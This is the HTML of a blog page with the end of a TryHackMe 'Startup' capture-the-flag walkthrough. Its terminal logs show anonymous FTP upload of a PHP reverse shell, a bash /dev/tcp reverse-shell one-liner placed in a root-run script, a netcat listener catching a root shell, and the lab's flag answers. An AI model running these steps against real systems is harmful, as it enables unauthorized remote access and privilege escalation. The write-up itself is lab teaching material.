+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Startup$ ftp 10.10.36.184
+</span></span><span class=line><span class=cl>Connected to 10.10.36.184.
+</span></span><span class=line><span class=cl>220 (vsFTPd 3.0.3)
+</span></span><span class=line><span class=cl>Name (10.10.36.184:kali): anonymous
+</span></span><span class=line><span class=cl>331 Please specify the password.
+</span></span><span class=line><span class=cl>Password:
+</span></span><span class=line><span class=cl>230 Login successful.
+</span></span><span class=line><span class=cl>Remote system type is UNIX.
+</span></span><span class=line><span class=cl>Using binary mode to transfer files.
+</span></span><span class=line><span class=cl>ftp&gt; ls -la
+</span></span><span class=line><span class=cl>200 PORT command successful. Consider using PASV.
+</span></span><span class=line><span class=cl>150 Here comes the directory listing.
+</span></span><span class=line><span class=cl>drwxr-xr-x    3 65534    65534        4096 Nov 12 04:53 .
+</span></span><span class=line><span class=cl>drwxr-xr-x    3 65534    65534        4096 Nov 12 04:53 ..
+</span></span><span class=line><span class=cl>-rw-r--r--    1 0        0               5 Nov 12 04:53 .test.log
+</span></span><span class=line><span class=cl>drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp
+</span></span><span class=line><span class=cl>-rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg
+</span></span><span class=line><span class=cl>-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt
+</span></span><span class=line><span class=cl>226 Directory send OK.
+</span></span><span class=line><span class=cl>ftp&gt; mget *
+</span></span><span class=line><span class=cl>mget ftp?
+</span></span><span class=line><span class=cl>200 PORT command successful. Consider using PASV.
+</span></span><span class=line><span class=cl>550 Failed to open file.
+</span></span><span class=line><span class=cl>mget important.jpg?
+</span></span><span class=line><span class=cl>200 PORT command successful. Consider using PASV.
+</span></span><span class=line><span class=cl>150 Opening BINARY mode data connection for important.jpg (251631 bytes).
+</span></span><span class=line><span class=cl>226 Transfer complete.
+</span></span><span class=line><span class=cl>251631 bytes received in 0.59 secs (417.2951 kB/s)
+</span></span><span class=line><span class=cl>mget notice.txt?
+</span></span><span class=line><span class=cl>200 PORT command successful. Consider using PASV.
+</span></span><span class=line><span class=cl>150 Opening BINARY mode data connection for notice.txt (208 bytes).
+</span></span><span class=line><span class=cl>226 Transfer complete.
+</span></span><span class=line><span class=cl>208 bytes received in 0.00 secs (140.4737 kB/s)
+</span></span><span class=line><span class=cl>ftp&gt; cd ftp
+</span></span><span class=line><span class=cl>250 Directory successfully changed.
+</span></span><span class=line><span class=cl>ftp&gt; ls -la
+</span></span><span class=line><span class=cl>200 PORT command successful. Consider using PASV.
+</span></span><span class=line><span class=cl>150 Here comes the directory listing.
+</span></span><span class=line><span class=cl>drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 .
+</span></span><span class=line><span class=cl>drwxr-xr-x    3 65534    65534        4096 Nov 12 04:53 ..
+</span></span><span class=line><span class=cl>226 Directory send OK.
+</span></span><span class=line><span class=cl>ftp&gt;
+</span></span></code></pre></td></tr></table></div></div><p><code>but Maya is looking pretty sus.</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Startup$ ftp 10.10.36.184
+</span></span><span class=line><span class=cl>Connected to 10.10.36.184.
+</span></span><span class=line><span class=cl>220 (vsFTPd 3.0.3)
+</span></span><span class=line><span class=cl>Name (10.10.36.184:kali): anonymous
+</span></span><span class=line><span class=cl>331 Please specify the password.
+</span></span><span class=line><span class=cl>Password:
+</span></span><span class=line><span class=cl>230 Login successful.
+</span></span><span class=line><span class=cl>Remote system type is UNIX.
+</span></span><span class=line><span class=cl>Using binary mode to transfer files.
+</span></span><span class=line><span class=cl>ftp&gt; put php-reverse-shell.php
+</span></span><span class=line><span class=cl>local: php-reverse-shell.php remote: php-reverse-shell.php
+</span></span><span class=line><span class=cl>200 PORT command successful. Consider using PASV.
+</span></span><span class=line><span class=cl>553 Could not create file.
+</span></span><span class=line><span class=cl>ftp&gt; ls -la
+</span></span><span class=line><span class=cl>200 PORT command successful. Consider using PASV.
+</span></span><span class=line><span class=cl>150 Here comes the directory listing.
+</span></span><span class=line><span class=cl>drwxr-xr-x    3 65534    65534        4096 Nov 12 04:53 .
+</span></span><span class=line><span class=cl>drwxr-xr-x    3 65534    65534        4096 Nov 12 04:53 ..
+</span></span><span class=line><span class=cl>-rw-r--r--    1 0        0               5 Nov 12 04:53 .test.log
+</span></span><span class=line><span class=cl>drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp
+</span></span><span class=line><span class=cl>-rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg
+</span></span><span class=line><span class=cl>-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt
+</span></span><span class=line><span class=cl>226 Directory send OK.
+</span></span><span class=line><span class=cl>ftp&gt; cd ftp
+</span></span><span class=line><span class=cl>250 Directory successfully changed.
+</span></span><span class=line><span class=cl>ftp&gt; put php-reverse-shell.php
+</span></span><span class=line><span class=cl>local: php-reverse-shell.php remote: php-reverse-shell.php
+</span></span><span class=line><span class=cl>200 PORT command successful. Consider using PASV.
+</span></span><span class=line><span class=cl>150 Ok to send data.
+</span></span><span class=line><span class=cl>226 Transfer complete.
+</span></span><span class=line><span class=cl>5494 bytes sent in 0.00 secs (67.1729 MB/s)
+</span></span><span class=line><span class=cl>ftp&gt; exit
+</span></span><span class=line><span class=cl>221 Goodbye.
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>www-data@startup:/$ cat recipe.txt
+</span></span><span class=line><span class=cl>Someone asked what our main ingredient to our spice soup is today. I figured I can&#39;t keep it a secret forever and told him it was love.
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>scp</span> <span class=n>suspicious</span><span class=o>.</span><span class=n>pcapng</span> <span class=n>kali</span><span class=err>@</span><span class=mf>10.8</span><span class=o>.</span><span class=mf>106.222</span><span class=p>:</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>kali</span><span class=o>/</span><span class=n>CTFs</span><span class=o>/</span><span class=n>tryhackme</span><span class=o>/</span><span class=n>Startup</span>
+</span></span><span class=line><span class=cl><span class=n>Could</span> <span class=ow>not</span> <span class=n>create</span> <span class=n>directory</span> <span class=s1>&#39;/var/www/.ssh&#39;</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=n>The</span> <span class=n>authenticity</span> <span class=n>of</span> <span class=n>host</span> <span class=s1>&#39;10.8.106.222 (10.8.106.222)&#39;</span> <span class=n>can</span><span class=s1>&#39;t be established.</span>
+</span></span><span class=line><span class=cl><span class=n>ECDSA</span> <span class=n>key</span> <span class=n>fingerprint</span> <span class=n>is</span> <span class=n>SHA256</span><span class=p>:</span><span class=n>xCE0Cpa4vJaXG1mwn7ciMO55E0R11HvAmXVl2ymdG</span><span class=o>+</span><span class=n>Y</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=n>Are</span> <span class=n>you</span> <span class=n>sure</span> <span class=n>you</span> <span class=n>want</span> <span class=n>to</span> <span class=k>continue</span> <span class=n>connecting</span> <span class=p>(</span><span class=n>yes</span><span class=o>/</span><span class=n>no</span><span class=p>)</span><span class=err>?</span> <span class=n>yes</span>
+</span></span><span class=line><span class=cl><span class=n>Failed</span> <span class=n>to</span> <span class=n>add</span> <span class=n>the</span> <span class=n>host</span> <span class=n>to</span> <span class=n>the</span> <span class=n>list</span> <span class=n>of</span> <span class=n>known</span> <span class=n>hosts</span> <span class=p>(</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/.</span><span class=n>ssh</span><span class=o>/</span><span class=n>known_hosts</span><span class=p>)</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=n>kali</span><span class=err>@</span><span class=mf>10.8</span><span class=o>.</span><span class=mf>106.222</span><span class=s1>&#39;s password:</span>
+</span></span><span class=line><span class=cl><span class=n>suspicious</span><span class=o>.</span><span class=n>pcapng</span>                             <span class=mi>100</span><span class=o>%</span>   <span class=mi>30</span><span class=n>KB</span>  <span class=mf>30.5</span><span class=n>KB</span><span class=o>/</span><span class=n>s</span>   <span class=mi>00</span><span class=p>:</span><span class=mi>00</span>
+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>startup</span><span class=p>:</span><span class=o>/</span><span class=n>incidents</span><span class=o>$</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>startup</span><span class=p>:</span><span class=o>/$</span> <span class=n>cd</span>
+</span></span><span class=line><span class=cl><span class=n>cd</span>
+</span></span><span class=line><span class=cl><span class=n>bash</span><span class=p>:</span> <span class=n>cd</span><span class=p>:</span> <span class=n>HOME</span> <span class=ow>not</span> <span class=n>set</span>
+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>startup</span><span class=p>:</span><span class=o>/$</span> <span class=n>ls</span>
+</span></span><span class=line><span class=cl><span class=n>ls</span>
+</span></span><span class=line><span class=cl><span class=n>bin</span>   <span class=n>etc</span>	  <span class=n>initrd</span><span class=o>.</span><span class=n>img</span><span class=o>.</span><span class=n>old</span>  <span class=n>media</span>  <span class=n>recipe</span><span class=o>.</span><span class=n>txt</span>  <span class=n>snap</span>  <span class=n>usr</span>	    <span class=n>vmlinuz</span><span class=o>.</span><span class=n>old</span>
+</span></span><span class=line><span class=cl><span class=n>boot</span>  <span class=n>home</span>	  <span class=n>lib</span>		  <span class=n>mnt</span>	 <span class=n>root</span>	     <span class=n>srv</span>   <span class=n>vagrant</span>
+</span></span><span class=line><span class=cl><span class=n>data</span>  <span class=n>incidents</span>   <span class=n>lib64</span>		  <span class=n>opt</span>	 <span class=n>run</span>	     <span class=n>sys</span>   <span class=k>var</span>
+</span></span><span class=line><span class=cl><span class=n>dev</span>   <span class=n>initrd</span><span class=o>.</span><span class=n>img</span>  <span class=n>lost</span><span class=o>+</span><span class=n>found</span>	  <span class=n>proc</span>	 <span class=n>sbin</span>	     <span class=n>tmp</span>   <span class=n>vmlinuz</span>
+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>startup</span><span class=p>:</span><span class=o>/$</span> <span class=n>cd</span> <span class=n>home</span>
+</span></span><span class=line><span class=cl><span class=n>cd</span> <span class=n>home</span>
+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>startup</span><span class=p>:</span><span class=o>/</span><span class=n>home</span><span class=o>$</span> <span class=n>cd</span> <span class=n>lennie</span>
+</span></span><span class=line><span class=cl><span class=n>cd</span> <span class=n>lennie</span>
+</span></span><span class=line><span class=cl><span class=n>bash</span><span class=p>:</span> <span class=n>cd</span><span class=p>:</span> <span class=n>lennie</span><span class=p>:</span> <span class=n>Permission</span> <span class=n>denied</span>
+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>startup</span><span class=p>:</span><span class=o>/</span><span class=n>home</span><span class=o>$</span> <span class=n>ls</span>
+</span></span><span class=line><span class=cl><span class=n>ls</span>
+</span></span><span class=line><span class=cl><span class=n>lennie</span>
+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>startup</span><span class=p>:</span><span class=o>/</span><span class=n>home</span><span class=o>$</span> <span class=n>cd</span> <span class=n>lennie</span>
+</span></span><span class=line><span class=cl><span class=n>cd</span> <span class=n>lennie</span>
+</span></span><span class=line><span class=cl><span class=n>bash</span><span class=p>:</span> <span class=n>cd</span><span class=p>:</span> <span class=n>lennie</span><span class=p>:</span> <span class=n>Permission</span> <span class=n>denied</span>
+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>startup</span><span class=p>:</span><span class=o>/</span><span class=n>home</span><span class=o>$</span> <span class=n>sudo</span> <span class=o>-</span><span class=n>l</span>
+</span></span><span class=line><span class=cl><span class=n>sudo</span> <span class=o>-</span><span class=n>l</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>sudo</span><span class=p>]</span> <span class=n>password</span> <span class=k>for</span> <span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>:</span> <span class=n>c4ntg3t3n0ughsp1c3</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Sorry</span><span class=p>,</span> <span class=n>try</span> <span class=n>again</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>sudo</span><span class=p>]</span> <span class=n>password</span> <span class=k>for</span> <span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Sorry</span><span class=p>,</span> <span class=n>try</span> <span class=n>again</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>sudo</span><span class=p>]</span> <span class=n>password</span> <span class=k>for</span> <span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>:</span> <span class=n>c4ntg3t3n0ughsp1c3</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sudo</span><span class=p>:</span> <span class=mi>3</span> <span class=n>incorrect</span> <span class=n>password</span> <span class=n>attempts</span>
+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>startup</span><span class=p>:</span><span class=o>/</span><span class=n>home</span><span class=o>$</span> <span class=n>cat</span> <span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>passwd</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>lennie@startup:~$ ls -lA
+</span></span><span class=line><span class=cl>total 12
+</span></span><span class=line><span class=cl>drwxr-xr-x 2 lennie lennie 4096 Nov 12 04:53 Documents
+</span></span><span class=line><span class=cl>drwxr-xr-x 2 root   root   4096 Nov 12 04:54 scripts
+</span></span><span class=line><span class=cl>-rw-r--r-- 1 lennie lennie   38 Nov 12 04:53 user.txt
+</span></span><span class=line><span class=cl>lennie@startup:~$ cat user.txt
+</span></span><span class=line><span class=cl>THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>lennie@startup:~$ ls -lA scripts/
+</span></span><span class=line><span class=cl>total <span class=m>8</span>
+</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> root root <span class=m>77</span> Nov <span class=m>12</span> 04:53 planner.sh
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root  <span class=m>1</span> Nov <span class=m>13</span> 12:55 startup_list.txt
+</span></span><span class=line><span class=cl>lennie@startup:~$ cat scripts/startup_list.txt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>lennie@startup:~$ cat scripts/planner.sh
+</span></span><span class=line><span class=cl><span class=c1>#!/bin/bash</span>
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=nv>$LIST</span> &gt; /home/lennie/scripts/startup_list.txt
+</span></span><span class=line><span class=cl>/etc/print.sh
+</span></span><span class=line><span class=cl>lennie@startup:~$ <span class=nb>echo</span> <span class=nv>$LIST</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>lennie@startup:~$
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
+</span></span></span><span class=line><span class=cl>/bin/bash -c <span class=s1>&#39;bash -i &gt;&amp; /dev/tcp/10.8.106.222/9002 0&gt;&amp;1&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Startup$ nc -lnvp 9002
+</span></span><span class=line><span class=cl>Listening on 0.0.0.0 9002
+</span></span><span class=line><span class=cl>Connection received on 10.10.36.184 36364
+</span></span><span class=line><span class=cl>bash: cannot set terminal process group (1690): Inappropriate ioctl for device
+</span></span><span class=line><span class=cl>bash: no job control in this shell
+</span></span><span class=line><span class=cl>root@startup:~# ls -lA
+</span></span><span class=line><span class=cl>ls -lA
+</span></span><span class=line><span class=cl>total 20
+</span></span><span class=line><span class=cl>-rw-r--r-- 1 root root 3106 Oct 22  2015 .bashrc
+</span></span><span class=line><span class=cl>drwxr-xr-x 2 root root 4096 Nov 12 04:54 .nano
+</span></span><span class=line><span class=cl>-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+</span></span><span class=line><span class=cl>-rw-r--r-- 1 root root   38 Nov 12 04:53 root.txt
+</span></span><span class=line><span class=cl>drwx------ 2 root root 4096 Nov 12 04:50 .ssh
+</span></span><span class=line><span class=cl>root@startup:~# cat root.txt
+</span></span><span class=line><span class=cl>cat root.txt
+</span></span><span class=line><span class=cl>THM{f963aaa6a430f210222158ae15c3d76d}
+</span></span></code></pre></td></tr></table></div></div><p>What is the secret spicy soup recipe?</p><p><code>love</code></p><p>What are the contents of user.txt?</p><p><code>THM{03ce3d619b80ccbfb3b7fc81e46c0e79}</code></p><p>What are the contents of root.txt?</p><p><code>THM{f963aaa6a430f210222158ae15c3d76d}</code></p><h2 id=task-2-credits>Task 2 Credits<a hidden class=anchor aria-hidden=true href=#task-2-credits>#</a></h2><p>Spice Hut was very happy with your results and it is guaranteed they will spread word about your excellence with their partners. Astounding work!</p><p>I&rsquo;d like to thank my <a href=https://elbee.xyz/>coffee</a> as this took me hours to make, being that it is the first time I have done something like this.</p><p>I&rsquo;d like to thank <a href=https://tryhackme.com/p/ku5e>ku5e</a> for being a good sensei and <a href=https://tryhackme.com/p/GeneralClaw>GeneralClaw</a>, my grammar cop.</p><p>I&rsquo;d like to thank my testers <a href=https://tryhackme.com/p/Amit25095>Amit25095</a>, <a href=https://tryhackme.com/p/Krypt0c>Krypt0c</a>, <a href=https://tryhackme.com/p/BarZigmon>BarZigmon</a> and <a href=https://tryhackme.com/p/powershot>powershot</a>.</p><p>Additionally, I&rsquo;d love to thank TryHackMe not just for their platform, of which has changed my life, but for giving me this opportunity to give back to the community.</p><p>And of course, I&rsquo;d like to thank you for playing. Hope to see you soon!</p><p>Congratulations!</p><p><code>No answer needed</code></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/tryhackme/>Tryhackme</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://s4ch.github.io/>CyFun</a></span>
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
